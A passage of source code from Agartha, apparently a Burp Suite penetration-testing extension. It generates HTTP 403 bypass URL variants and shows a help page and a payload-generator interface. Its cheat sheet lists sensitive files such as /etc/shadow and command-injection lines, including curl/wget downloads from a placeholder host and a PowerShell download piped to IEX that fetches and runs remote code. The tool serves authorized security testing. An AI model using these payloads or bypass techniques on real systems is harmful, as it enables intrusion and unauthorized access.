                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column12



                # column13, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/%09/company/users/admin?id=1%09
                #                           http://dvwa.local/company/%09/users/admin?id=1%09
                #                           http://dvwa.local/company/users/%09/admin?id=1%09
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["/./", "/%09/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            _url = (_url + _replaceWith[1:-1]).replace("//", "/").replace(":/", "://")
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)][2:-2]
                            for _location in _locations:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column13


                # column14, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin.html?id=1
                _headerOrg = list(_matrixList[x][1])
                _fileExtensions = [".js", ";.js", ".html", ";.html", ".js%2f", ";.js%2f", ".html%2f", ";.html%2f", ";index.html", "%00.html", ";%00.html", "%00.js", ";%00.js"]
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        for _fileExtension in _fileExtensions:
                            if urlparse.urlparse(_url).path.endswith("/"):
                                url = _url[: _locations[-1]] + _fileExtension + "/" + _url[_locations[-1] + 1:]
                            else:
                                url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + _fileExtension + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                            if url not in _rowUrls:
                                _rowUrls.append(url)
                                _header = list(_headerOrg[1:])
                                _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                self._httpCalls =[]
                                _columnNum = _columnNum + 1
                                _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                _cellHint.append("Target URL is '" + url + "'")
                # column14


                # column15, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local//company//users//admin?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWiths = ["//", "///", "////", "/////"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                        else:
                            url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path.replace("/", _replaceWith))
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column15


                # column16, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/COMPANY/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/USERS/ADMIN?ID=1
                #                           http://dvwa.local/company/users/ADMIN?ID=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if _url.endswith('/'):
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                    else: 
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        _locations.append(len(_url))
                    for _location in _locations[2:-1]:
                        url = _url[:_location] + _url[_location:].upper()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                        url = _url[:_location] + _url[_location:].lower()
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column16


                # column17, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/users/admin/?id=1
                _headerOrg = list(_matrixList[x][1])
                for _url in _urls:
                    if len(urlparse.urlparse(_url).path) > 1:
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        if urlparse.urlparse(_url).path.endswith("/"):
                            url = _url[: _locations[-1]] + _url[_locations[-1]:][1:]
                        else:
                            url = _url[: _locations[2] + len(urlparse.urlparse(_url).path)] + "/" + _url[_locations[2] + len(urlparse.urlparse(_url).path):]
                        if url not in _rowUrls:
                            _rowUrls.append(url)
                            _header = list(_headerOrg[1:])
                            _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                            self._httpCalls =[]
                            _columnNum = _columnNum + 1
                            _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                            _cellHint.append("Target URL is '" + url + "'")
                # column17



                # column18, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin%00?id=1
                #                           http://dvwa.local/company/users/../users/admin%00?id=1
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path[:-1] + "%00/")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _url = _url.replace(urlparse.urlparse(_url).path, urlparse.urlparse(_url).path + "%00")
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column18


                # column19, example url:    http://dvwa.local/company/users/admin?id=1
                #                           http://dvwa.local/company/../company/users/admin?id=1%00
                #                           http://dvwa.local/company/users/../users/admin?id=1%00
                _headerOrg = list(_matrixList[x][1])
                _replaceWith =  "/../"
                for _url in _urls:
                    if _url.count('/') != 3:
                        _url = _url + "%00"
                        if urlparse.urlparse(_url).path.endswith('/'):
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-2]
                        else: 
                            _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                        _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                        path = _url[:_locations[2]]
                        for _path in _paths:
                            if _path:
                                path = path + "/" + _path
                                url = _url.replace(_url[: _locations[_url.count('/') - 1]], _url[: _locations[_url.count('/') - 1]])
                                url =  url.replace(path, path + _replaceWith + _path)
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _header = list(_headerOrg[1:])
                                    _header.insert(0, str(_headerOrg[0]).split(" ", 2)[0] + " /" + url.split("/", 3)[3] + " " + str(_headerOrg[0]).split(" ", 2)[2])
                                    self._httpCalls =[]
                                    _columnNum = _columnNum + 1
                                    _reqRes.append(self.authenticationMatrixCalls(url, _header, _body, _portNum, x, _columnNum, _progressBar))
                                    _cellHint.append("Target URL is '" + url + "'")
                # column19


                self._httpReqResAuthentication.append(_reqRes)
                self._httpReqResAuthenticationTipMessage.append(_cellHint)


            self.currentText = "The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
            if self.errorNumbers != 0:
                successRate = 100 - 100 * float(self.errorNumbers) / float(self.cellNumbers)
                if successRate > 69:
                    self.currentText = "Successful connection rate is " + str(int(successRate)) + "%"
                    self.currentText = self.currentText + ". The table has been populated. Blank is default color, which indicates no issue has been found. Http response codes are shown below, you can click any of them for more details."
                else:
                    self.currentText = "Successful connection rate is very low, please check your network connection!"
            
            self.progressBarAuthenticationPanel.setValue(1000000)
            self._btnAuthenticationFetchHistory.setEnabled(True)
            self._btnAuthenticationReset.setEnabled(True)
            self._cbAuthenticationHost.setEnabled(True)
            self._btnAuthenticationRun.setEnabled(True)
            self._cbAuthenticationEnableFilter.setEnabled(True)
            self._lblAuthenticationDaystoShow.setEnabled(True)
            self._cbAuthenticationDaystoShow.setEnabled(True)
            self._lblAuthenticationEnableURLGroup.setEnabled(True)
            self._cbAuthenticationEnableURLGroup.setEnabled(True)
            self._lblAuthenticationEnableFilter2.setEnabled(True)
            self._lblAuthenticationDaystoShow.setVisible(False)
            self._cbAuthenticationDaystoShow.setVisible(False)
            self.txAuthenticationEnableKeyWordURL.setEnabled(True)
            self._customRendererAuthentication =  UserEnabledRenderer(self.tableMatrixAuthentication.getDefaultRenderer(str), self._httpReqResAuthentication, self._httpReqResAuthenticationTipMessage)
            self._customTableColumnModelAuthentication = self.tableMatrixAuthentication.getColumnModel()

            _setPreferredWidth = (self.tableMatrixAuthentication.getWidth() - 400) / self.tableMatrixAuthentication.getColumnCount()
            if _setPreferredWidth < 40:
                _setPreferredWidth = 40
            for y in range(1, self.tableMatrixAuthentication.getColumnCount()):
                self._customTableColumnModelAuthentication.getColumn(y).setCellRenderer(self._customRendererAuthentication)
                self.tableMatrixAuthentication.getColumnModel().getColumn(y).setPreferredWidth(_setPreferredWidth)
            self._customTableColumnModelAuthentication.getColumn(0).setCellRenderer(self._customRendererAuthentication)
            self.tableMatrixAuthentication.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
            self.tableMatrixAuthentication.repaint()

            sleep(0.1)
            colors = ""
            if self._customRendererAuthentication._colorsRed:
                colors += "Red"
            if self._customRendererAuthentication._colorsOrange:
                if colors:
                    colors += ", Orange"
                else:
                    colors += "Orange"
            if self._customRendererAuthentication._colorsYellow:
                if colors:
                    colors += ", Yellow"
                else:
                    colors += "Yellow"
            
            if colors:
                if colors.count(",") >= 1:
                    colors += " colors show different level of possible access violations"
                else:
                    colors += " color shows possible access violations"

            if colors:
                self.currentText = self.currentText.replace("Blank is default color, which indicates no issue has been found.", colors +", however blank is default color, which indicates no issue has been found.")
            self._lblAuthenticationNotification.text = self.currentText

        except:
            print str(sys.exc_info()[1])

        return

    def urlFinder(self, path, url):
        if '..' in path:
            if (url.count('/') - 3) >= path.count('..'):
                return posixpath.normpath(url.rsplit('/',1)[0] + "/" + path).replace('http:/','http://')
            else:
                return url.split('/',3)[0] + "//" + url.split('/',3)[2] + "/" + path.rsplit('../',1)[1]
        elif path.startswith('http'):
            return path
        else:
            if path.startswith('/'):
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + path
            else:
                return url.split("/", 3)[0] + "//" + url.split("/", 3)[2] + "/" + path

    def _tabHelpUI(self):
        self._tabHelpJPanel = JPanel(BorderLayout())
        self._tabHelpJPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self.editorPaneInfo = JEditorPane()
        self.editorPaneInfo.setEditable(False)
        self.editorPaneInfo.setContentType("text/html")
        htmlString = "<html><body><table width=1000 border=0 cellspacing=0><tr><td><h3>Author:\t\t\tVolkan Dindar<br/>Github:\t\t\thttps://github.com/volkandindar/agartha</h3><br/>"
        htmlString += """
        <h1>Agartha</h1>
        <h4>Payload Injection (LFI, RCE, SQLi, with optional BCheck), Auth Issues (Access Matrix, HTTP 403), HTTP-to-JavaScript, and Bambdas</h4>
        <hr/>
        <p>Agartha, specializes in advance payload generation and access control assessment. It adeptly identifies vulnerabilities related to injection attacks, and authentication/authorization issues. The dynamic payload generator crafts extensive wordlists for various injection vectors, including SQL Injection, Local File Inclusion (LFI), and Remote Code Execution(RCE). Furthermore, the extension constructs a comprehensive user access matrix, revealing potential access violations and privilege escalation paths. It also assists in performing HTTP 403 bypass checks, shedding light on auth misconfigurations. Additionally, it can convert HTTP requests to JavaScript code to help digging up XSS issues more.</p>
        <p></p>
        <p>In summary:</p>
        <ul>
        <li><strong>Payload Generator</strong>: It dynamically constructs comprehensive wordlists for injection attacks, incorporating various encoding and escaping characters to enhance the effectiveness of security testing. These wordlists cover critical vulnerability classes like SQL Injection (SQLi), Local File Inclusion (LFI), Remote Code Execution (RCE), and now also support BCheck syntax for seamless integration with Burp&#39;s BCheck framework.<ul>
        <li><strong>Local File Inclusion, Path Traversal:</strong> It helps identifying vulnerabilities that allow attackers to access files on the server&#39;s filesystem.</li>
        <li><strong>Remote Code Execution, Command Injection:</strong> It aims to detects potential command injection points, enabling robust testing for code execution vulnerabilities.</li>
        <li><strong>SQL Injection:</strong> It assists to uncover SQL Injection vulnerabilities, including Stacked Queries, Boolean-Based, Union-Based, and Time-Based.</li>
        </ul>
        </li>
        <li><strong>Auth Matrix</strong>: By constructing a comprehensive access matrix, the tool reveals potential access violations and privilege escalation paths. This feature enhances security posture by addressing authentication and authorization issues. <ul>
        <li>You can use the web <strong>&#39;Spider&#39;</strong> feature to generate a sitemap/URL list, and it will crawl visible links from the user&#39;s session automatically.</li>
        </ul>
        </li>
        <li><strong>403 Bypass</strong>: It aims to tackle common access restrictions, such as HTTP 403 Forbidden responses. It utilizes techniques like URL manipulation and request header modification to bypass implemented limitations.</li>
        <li><strong>Copy as JavaScript</strong>: It converts Http requests to JavaScript code for further XSS exploitation and more.</li>
        <li><strong>Bambdas Script Generator</strong>: The feature supports automatic generation of Bambdas-compatible scripts based on user input. It eliminates the need for manual coding, enabling faster creation of custom scripts and streamlining integration with the Bambdas engine.</li>
        </ul>"""
        htmlString += "</td></tr></table></body></html>"
        
        self.editorPaneInfo.setText(htmlString)
        self.editorScrollPaneInfo = JScrollPane(self.editorPaneInfo)
        self.editorScrollPaneInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)

        #  Custom MouseWheelListener to slow down scroll
        class SlowScrollMouseWheelListener(MouseWheelListener):
            def mouseWheelMoved(inner_self, e):
                scrollBar = self.editorScrollPaneInfo.getVerticalScrollBar()
                amount = e.getUnitsToScroll() * 5  # scale this value (3 is slower than default 15+)
                scrollBar.setValue(scrollBar.getValue() + amount)
                e.consume()  # prevent default fast scroll

        self.editorPaneInfo.addMouseWheelListener(SlowScrollMouseWheelListener())
        self._tabHelpJPanel.add(self.editorScrollPaneInfo, BorderLayout.CENTER)

    def _tabDictUI(self):
        # top panel
        self._txtDefaultLFI = "Example: '/etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultCommandInj = "Examples: $'sleep 120', >'timeout 120' - for 2 minutes"
        self._txtDefaultSQLi = "No input is needed to supply!"
        self._txtCheatSheetLFI = ""
        self._txtCheatSheetLFI += "Common files for Linux\t\t\tCommon files for Windows\n"
        self._txtCheatSheetLFI += "\t/etc/passwd\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\tC:\\windows\\win.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\tC:\\windows\\system.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\tC:\\windows\\system32\\notepad.exe\n"
        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
        self._txtCheatSheetLFI += "\t/etc/shadow\t\t\tC:\\windows\\system32\\license.rtf\n"
        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\tC:\\windows\\system32\\eula.txt\n"
        
        self._txtCheatSheetCommandInj = ""
        self._txtCheatSheetCommandInj += "Common commands for Unix\t\t\tCommon commands for Windows\n"
        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\ttype file.txt\n"
        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
        self._txtCheatSheetCommandInj += "\twget http://X.X.X.X/file.txt -O /tmp/file.txt\t\t(New-Object System.Net.WebClient).DownloadString('http://http://X.X.X.X/file.txt') | IEX\n"
        _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
        _lblDepth.setToolTipText("Generate payloads only for a specific depth.")
        _btnGenerateDict = JButton("Generate the Payloads", actionPerformed=self.funcGeneratePayload)
        _btnGenerateDict.setToolTipText("Click to generate payloads.")
        _btnGenerateDictForBCheck = JButton("Generate payloads for BCheck", actionPerformed=self.funcGeneratePayloadForBCheck)
        _btnGenerateDictForBCheck.setToolTipText("Generate payloads for BCheck.")
        self._lblStatusLabel = JLabel()
        self._lblStatusLabel.setText("Please provide a path for payload generation!")
        self._txtTargetPath = JTextField(self._txtDefaultLFI, 30)
        self._rbDictLFI = JRadioButton('LFI / PT', True, itemStateChanged=self.funcRBSelection)
        self._rbDictLFI.setToolTipText("Payload generation for Local File Inclusion, Path Traversal.")
        self._rbDictCommandInj = JRadioButton('Command Inj / RCE', itemStateChanged=self.funcRBSelection)
        self._rbDictCommandInj.setToolTipText("Payload generation for Command Injection, Remote Code Execution.")
        self._rbDictSQLi = JRadioButton('SQL Injection', itemStateChanged=self.funcRBSelection)
        self._rbDictSQLi.setToolTipText("Payload generation for various type of SQL attacks.")
        _rbDictCheatSheet = JRadioButton('Cheat Sheet', itemStateChanged=self.funcRBSelection)
        _rbDictFuzzer = JRadioButton('Fuzzer', itemStateChanged=self.funcRBSelection)
        _rbPanel = JPanel()
        _rbPanel.add(self._rbDictLFI)
        _rbPanel.add(self._rbDictCommandInj)
        _rbPanel.add(self._rbDictSQLi)
        _rbGroup = ButtonGroup()
        _rbGroup.add(self._rbDictLFI)
        _rbGroup.add(self._rbDictCommandInj)
        _rbGroup.add(self._rbDictSQLi)
        _rbGroup.add(_rbDictCheatSheet)
        _rbGroup.add(_rbDictFuzzer)
        self._cbDictWafBypass = JCheckBox('Waf Bypass', True)
        self._cbDictWafBypass.setToolTipText("It includes bypass techniques like null bytes, various type of encodings, different file extensions, etc.")
        self._cbDictEquality = JCheckBox(')', False)
        self._cbDictEquality.setToolTipText("Generate payloads only for a specific depth.")
        self._cbDictDepth = JComboBox(list(range(0, 20)))
        self._cbDictDepth.setSelectedIndex(5)
        self._cbDictDepth.setToolTipText("Folder depth limit. How much folder above should it go?")
        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _cbDictDepthPanel.add(self._cbDictDepth)
        self._cbDictCommandInjEncoding = JCheckBox('URL Encoding', False)
        self._cbDictCommandInjEncoding.setToolTipText("Encodes the payload outcome.")
        self._cbDictCommandInjOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._cbDictCommandInjOpt.add(self._cbDictCommandInjEncoding)
        self._cbDictCommandInjOpt.setVisible(False)
        self._cbStackedSQL = JCheckBox('Stacked Queries', False)
        self._cbStackedSQL.setToolTipText("Stacked Query SQL Injection")
        self._cbTimeBased = JCheckBox('Time-Based', False)
        self._cbTimeBased.setToolTipText("Time-Based SQL Injection")
        self._cbUnionBased = JCheckBox('Union-Based', False, itemStateChanged=self._cbUnionBasedFunc)
        self._cbUnionBased.setToolTipText("Union-Based SQL Injection")
        self._cbUnionDepth = JComboBox(list(range(1, 20)))
        self._cbUnionDepth.setSelectedIndex(4)
        self._cbUnionDepth.setEnabled(False)
        self._cbUnionDepth.setToolTipText("Column numbers")
        self._cbBooleanBased = JCheckBox('Boolean-Based', True)
        self._cbBooleanBased.setToolTipText("Boolean-Based SQL Injection")
        self._cbMssqlBased = JCheckBox('MSSQL', True)
        self._cbMssqlBased.setToolTipText("Select database to include.")
        self._cbMysqlBased = JCheckBox('MYSQL', True)
        self._cbMysqlBased.setToolTipText("Select database to include.")
        self._cbPostgreBased = JCheckBox('POSTGRESQL', True)
        self._cbPostgreBased.setToolTipText("Select database to include.")
        self._cbOracleBased = JCheckBox('ORACLE', True)
        self._cbOracleBased.setToolTipText("Select database to include.")
        self._cbSqlWafBypass = JCheckBox('Waf Bypass', True)
        self._cbSqlWafBypass.setToolTipText("It includes protection bypass techniques, like null bytes, encoding, etc.")
        self._cbSqlEncoding = JCheckBox('URL Encoding', False)
        self._cbSqlEncoding.setToolTipText("Encodes the payload outcome.")
        _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabDictPanel_1.add(self._txtTargetPath, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDict, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_btnGenerateDictForBCheck, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
        self._tabDictPanel_LFI.setVisible(True)
        self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLType.setVisible(False)
        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
        self._tabDictPanel_SQLOptions.setVisible(False)
        self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionBased, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.add(self._cbUnionDepth, BorderLayout.PAGE_START)
        self._tabDictPanel_SQLi.setVisible(False)
        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._cbDictCommandInjOpt, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
        _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
        _tabDictPanel_1.setPreferredSize(Dimension(400, 90))
        _tabDictPanel_1.setMinimumSize(Dimension(400, 90))
        # top panel

        # center panel
        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
        _tabDictPanel_2.add(self._lblStatusLabel)
        # center panel
        
        # bottom panel 
        self._tabDictResultDisplay = JTextPane()
        self._tabDictResultDisplay.setContentType("text")
        self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
        self._tabDictResultDisplay.setEditable(False)
        _tabDictPanel_3 = JPanel(BorderLayout(10, 10))
        _tabDictPanel_3.setBorder(EmptyBorder(10, 0, 0, 0))
        _tabDictPanel_3.add(JScrollPane(self._tabDictResultDisplay), BorderLayout.CENTER)
        # bottom panel 

        self._tabDictPanel = JPanel()
        self._tabDictPanel.setLayout(BoxLayout(self._tabDictPanel, BoxLayout.Y_AXIS))
        self._tabDictPanel.add(_tabDictPanel_1)
        self._tabDictPanel.add(_tabDictPanel_2)
        self._tabDictPanel.add(_tabDictPanel_3)

    def tableMatrixReset(self, ev):
        self.tableMatrix = []        
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        self.userCount = 0
        self.userNames = []
        self.userNames.append("No Authentication")
        self.userNamesHttpReq = []
        self.userNamesHttpReq.append("")
        self.userNamesHttpUrls = [[]]
        self.httpReqRes = [[],[],[],[],[]]
        self.httpReqRes.append([])
        self._requestViewer.setMessage("", False)
        self._responseViewer.setMessage("", False)
        self._lblAuthNotification.text = "Please add users to create an auth matrix!"
        self._lblAuthNotification.setForeground (Color.black)
        self._tbAuthNewUser.setForeground (Color.black)        
        self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
        self._tbAuthHeader.setText(self._txtHeaderDefault)
        self._txtURLDefault = "http://localhost.com/example"
        self._tbAuthURL.setText(self._txtURLDefault)
        self._txtUserDefault = "User1"
        self._tbAuthNewUser.text = self._txtUserDefault.strip()
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._cbAuthColoring.setEnabled(False)
        self._cbAuthGETPOST.setEnabled(False)
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._btnAuthNewUserAdd.setEnabled(True)
        self.progressBar.setValue(0)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self._tabAuthPanel.setDividerLocation(0.25)
        self._tabAuthSplitpane.setDividerLocation(0.7)
        self._tabAuthSplitpaneHttp.setDividerLocation(0.5)

        return

    def siteMapGenerator(self, ev):
        t = Thread(target=self.siteMapGeneratorThread, args=[self])
        t.start()
        return

    def siteMapGeneratorThread(self, ev):
        for _url in self._tbAuthURL.getText().split('\n'):
            _url = _url.strip()
            if _url:
                _urlAdd = _url
                break
        if not _urlAdd:
            self._lblAuthNotification.text = "Please provide minimum one URL!"
            self._lblAuthNotification.setForeground (Color.red)
            return

        if not self.isURLValid(str(_urlAdd)) or _urlAdd == self._txtURLDefault:
            self._tbAuthURL.setForeground (Color.red)
            self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _urlAdd + "'"
            self._lblAuthNotification.setForeground (Color.red)
            return
        self._tbAuthURL.setForeground (Color.black)
        
        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
            self._tbAuthHeader.setForeground (Color.red)
            self._lblAuthNotification.text = "Please provide a valid header!"
            self._lblAuthNotification.setForeground (Color.red)
            return        
        self._tbAuthHeader.setForeground (Color.black)        
        self._lblAuthNotification.setForeground (Color.black)

        self._lblAuthNotification.text = "The crawler has just started. Please bear in mind, links based on Javascript may not be detected properly."
